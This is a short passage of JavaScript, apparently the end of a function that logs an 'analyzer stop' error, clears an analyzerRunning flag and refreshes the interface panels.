    log('err', 'analyzer stop: ' + e.message);
  }
  analyzerRunning = false;
  refreshPanels();
}
